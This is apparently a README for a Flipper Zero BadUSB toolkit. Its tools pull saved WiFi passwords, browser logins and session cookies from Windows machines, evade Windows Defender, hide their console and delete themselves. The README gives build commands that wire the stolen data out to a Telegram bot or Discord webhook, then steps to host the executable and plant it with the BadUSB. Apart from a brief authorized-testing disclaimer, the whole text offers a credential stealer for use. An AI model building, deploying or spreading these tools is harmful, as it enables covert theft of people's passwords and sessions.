# Flipper Zero Toolkit

Author: Tsali
Twitch: TsaliThighmane
OF: Tsali
bsky: @cultofjames.org
Site: cultofjames.org

A collection of Flipper Zero BadUSB scripts and custom tools for authorized penetration testing.

CERO MIEDO

---

## Tools

### WiFi Password Grabber (`badusb/wifi/`)

Extracts all saved WiFi passwords from Windows 10/11 using the native WLAN API. **Bypasses Windows Defender** — no PowerShell, no netsh, no flagged commands.

- Calls `WlanEnumInterfaces` / `WlanGetProfile` directly
- Hidden console, self-deleting, no trace
- Exfiltrates to Telegram bot
- Reports: hostname, username, public + private IP
- ~5 second runtime

### Browser Password & Cookie Grabber (`badusb/browser/`)

Extracts saved credentials from **7 browsers** + session cookies:

| Browser | Status |
|---------|--------|
| Chrome | URLs + usernames + passwords (pre-v127) + cookies |
| Edge | URLs + usernames + passwords (pre-v127) + cookies |
| Opera / Opera GX | URLs + usernames + passwords (pre-v127) + cookies |
| Brave | URLs + usernames + passwords (pre-v127) + cookies |
| Vivaldi | URLs + usernames + passwords (pre-v127) + cookies |
| Firefox | Encrypted creds + key4.db (offline crack with firepwd.py) |

**Note:** Chrome v127+ (v20 encryption) passwords can't currently be decrypted. URLs and usernames are still captured.

---

## Setup

### 1. Telegram Bot
- Message `@BotFather` → `/newbot` → save token
- Message `@userinfobot` → get chat ID

### 2. Compile

Use the build script with your preferred exfil method:

```bash
# Telegram exfil
python tools/build.py all --telegram --token YOUR_BOT_TOKEN --chat YOUR_CHAT_ID

# Discord webhook exfil
python tools/build.py all --discord --webhook https://discord.com/api/webhooks/ID/TOKEN

# Build only WiFi tool
python tools/build.py wifi --telegram --token YOUR_TOKEN --chat YOUR_CHAT

# Build only browser tool with Discord
python tools/build.py browser --discord --webhook https://discord.com/api/webhooks/ID/TOKEN
```

Or compile manually with Visual Studio:
```bash
# Telegram
cl /O2 /DUSE_TELEGRAM /DTG_TOKEN="your_token" /DTG_CHAT="your_chat_id" /Fe:wifi_grab.exe wifi_grab.c wlanapi.lib ole32.lib advapi32.lib user32.lib

# Discord
cl /O2 /DUSE_DISCORD /DDC_WEBHOOK="your_webhook_url" /Fe:wifi_grab.exe wifi_grab.c wlanapi.lib ole32.lib advapi32.lib user32.lib
```

**Requirements:** Visual Studio 2022 with C++ desktop development workload, Windows 10/11 SDK.

### 3. Host & Deploy
- Upload compiled `.exe` to your web server
- Update BadUSB scripts with your server URL
- Copy scripts to Flipper's `badusb/` folder

---

## Why Custom EXEs?

Windows Defender (2026) catches all common approaches:
- `netsh wlan key=clear` — flagged
- PowerShell AMSI bypass — flagged
- WebBrowserPassView — flagged
- UAC bypass (fodhelper/computerdefaults) — flagged

Custom tools using native Windows APIs have no known signatures.

---

## Legal

**Authorized penetration testing only.** Only use on systems you own or have explicit written permission to test.
